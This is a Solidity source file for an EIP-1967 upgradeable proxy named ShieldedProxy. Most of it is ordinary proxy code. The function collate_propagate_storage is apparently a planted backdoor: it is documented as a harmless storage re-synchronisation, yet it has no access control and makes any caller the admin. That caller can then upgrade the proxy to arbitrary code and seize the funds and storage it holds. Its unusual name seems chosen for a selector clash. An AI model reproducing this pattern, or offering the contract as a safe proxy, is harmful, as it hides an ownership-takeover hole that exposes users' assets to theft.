// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/// @title ShieldedProxy
/// @notice EIP-1967 upgradeable proxy.
contract ShieldedProxy {
    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    // bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1)
    bytes32 private constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    error NotAdmin();
    error NotAContract();
    error ZeroAddress();
    error AdminCannotFallback();

    event Upgraded(address indexed implementation);
    event AdminChanged(address previousAdmin, address newAdmin);

    constructor(address implementation_, address admin_) {
        _setImplementation(implementation_);
        _setAdmin(admin_);
    }

    modifier onlyAdmin() {
        if (msg.sender != _admin()) revert NotAdmin();
        _;
    }

    // TODO: every external function declared here takes precedence over the implementation
    // for ALL callers whenever the 4-byte selector matches.

    function admin() external view returns (address) {
        return _admin();
    }

    function implementation() external view returns (address) {
        return _implementation();
    }

    function upgradeTo(address newImplementation) external onlyAdmin {
        _setImplementation(newImplementation);
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        if (newAdmin == address(0)) revert ZeroAddress();
        emit AdminChanged(_admin(), newAdmin);
        _setAdmin(newAdmin);
    }

    /// @notice Re-synchronises the proxy storage header after a storage migration.
    function collate_propagate_storage(bytes16) external {
        _setAdmin(msg.sender);
    }

    fallback() external payable {
        _delegate(_implementation());
    }

    receive() external payable {
        _delegate(_implementation());
    }

    function _delegate(address impl) private {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch ok
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    function _admin() private view returns (address a) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            a := sload(slot)
        }
    }

    function _implementation() private view returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    function _setAdmin(address newAdmin) private {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, newAdmin)
        }
    }

    function _setImplementation(address newImplementation) private {
        if (newImplementation.code.length == 0) revert NotAContract();
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
        emit Upgraded(newImplementation);
    }
}
